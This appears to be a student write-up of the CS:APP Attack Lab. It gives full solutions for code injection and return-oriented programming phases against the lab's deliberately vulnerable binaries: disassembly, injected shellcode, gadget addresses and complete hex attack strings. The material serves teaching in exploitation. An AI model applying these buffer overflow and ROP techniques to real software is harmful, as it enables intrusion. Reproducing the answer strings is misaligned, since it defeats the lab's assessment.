# Part I: Code Injection Attacks

## Level 1:

Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

```bash
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq 

00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

In order to let `<getbuf>` return to `<touch1>` instead of `<test>`, we just need to modify the return address from 401976 to 4017c0.

Something need to be noticed:

1. At first, getbuf reserves 0x28 bytes for stack (sub $0x28 %rsp).
2. x86-64 is little endian machine, so we need to insert 4017c0 in reverse order.

Byte code(40 gabage bytes with 8 bytes address):

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

## Level 2:

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.

```bash
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

1. In order to let `<getbuf>` return to `<touch2>` instead of `<test>`, we need to set up the final return address as 0x4017ec.
2. In order to insert the cookie, we need to go to some addresses that we can modify to insert the instruction first.

What is the best place that we can modify? The stack we are working in the `<getbuf>`

We can print stack range addresses by (gdb) i r $rsp: 0x5561dc78 to 0x5561dca0.

```
00 00 00 00 00 00 00 00 // 0x5561dc78
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 // 0x5561dca0
```

The code we want to insert is:

```bash
mov $0x59b997fa,%rdi # cookie
pushq $0x4017ec
ret
```

After complie:

```bash
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00		pushq  $0x4017ec
   c:   c3                      retq
```

Fill this into our attack string:

```bash
48 c7 c7 fa 97 b9 59 68 // 0x5561dc78
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 // 0x5561dca0
```

## Level 3:

Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.

```bash
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>

000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	retq   
```

The task is similar to level 2, while the difference is that we need to store the cookie somewhere in the stack, instead of passing cookie directly into rdi register. Through observation, we can found touch3 and hexmatch will modify 32 bytes totally at their beginning, so we can not put the cookie there.

Preparation for attack:

Cookie: 0x59b997fa -> 35 39 62 39 39 37 66 61 00 (ascii)

Injection code:

```bash
mov $0x5561dca8,%rdi
pushq $0x4018fa
ret
```

Injection string:

```bash
48 c7 c7 a8 dc 61 55 68 // 0x5561dc78
fa 18 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 // 0x5561dca0
35 39 62 39 39 37 66 61 // 0x5561dca8 9bytes to hold the cookie
00
```

# Return-Oriented Programming

## Level 2:

For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).

Farming process:

1. Useful popq instuctions

| register | encoding | address |
| -------- | -------- | ------- |
| rax      | 58 90 c3 | 4019ab  |
| rax      | 58 90 c3 | 4019cc  |

2. Useful movq instuctions

| register | encoding       | address |
| -------- | -------------- | ------- |
| rax, rdi | 48 89 c7 c3    | 4019a2  |
| rax, rdi | 48 89 c7 90 c3 | 4019c5  |

So we can contruct the attack string:

```bash
00 00 00 00 00 00 00 00 /* 0x5561dc78 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* address of popq %rax */
ab 19 40 00 00 00 00 00 /* 0x5561dca0 */
/* cookie */
fa 97 b9 59 00 00 00 00 
/* address of movq %rax,%rdi */
a2 19 40 00 00 00 00 00
/* address of touch2 */
ec 17 40 00 00 00 00 00

```

## Level 3:

Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so.

Target: atfer runing the attack string, we need cookie to be stored in one address, and rdi = that address.

Farming process:

Due to the randomization of stack, we may not be able to know what address we store the cookie, but we can get this address by other address (mov %rsp,%register) + offset. We also notice that there is an addition function in the farm:

```bash
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq 
```

So we can launch the attack by following processes:

```
// gabage bytes  
// put the current address into rdi
// put the offset into rsi
// add rdi and rsi
// put the sum into rdi
// address of touch3
// put the cookie here 
```

Some useful registers info:

```
popq %rax         // 4019ab
movq %rax,%rdi    // 4019a2
movq %rsp,%rax    // 401a06
movl %ecx,%esi    // 401a13
movl %eax,%edx    // 4019dd
movl %edx,%ecx    // 401a34
```

Therefore, we can bypass the values to rdi and rsi through this way:

rax->rdi, rax->edx->ecx->esi

We can get the attack sequence:

```
00 00 00 00 00 00 00 00 /* gabage bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 /* put the current address into rdi */
a2 19 40 00 00 00 00 00 /* rsp points at this line when movq %rsp,%rax */
ab 19 40 00 00 00 00 00 /* put the offset(8 lines) into rsi */
48 00 00 00 00 00 00 00 /* offset 9 lines * 8 = 72(0x48) */
dd 19 40 00 00 00 00 00 
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00 /* add rdi and rsi into rax add_xy */
a2 19 40 00 00 00 00 00 /* put the rax into rdi */
fa 18 40 00 00 00 00 00 /* address of touch3 */
35 39 62 39 39 37 66 61 /* cookie */
00 
```
